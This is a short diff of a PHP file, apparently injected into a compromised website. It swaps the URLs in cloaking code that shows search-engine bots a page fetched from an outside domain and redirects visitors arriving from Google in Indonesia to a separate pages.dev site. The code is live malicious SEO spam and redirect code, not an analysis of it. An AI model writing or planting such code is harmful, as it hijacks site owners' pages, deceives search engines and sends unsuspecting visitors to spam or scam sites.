@@ -14,13 +14,13 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/amab.html');
+echo file_get_contents('https://theonlyd.xyz/taalumgroup.html');
 exit;
 }
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://amab.pages.dev/no-money-no-honey/");
+header("Location: https://diam-disana.pages.dev/");
 exit;
 }
 ?>
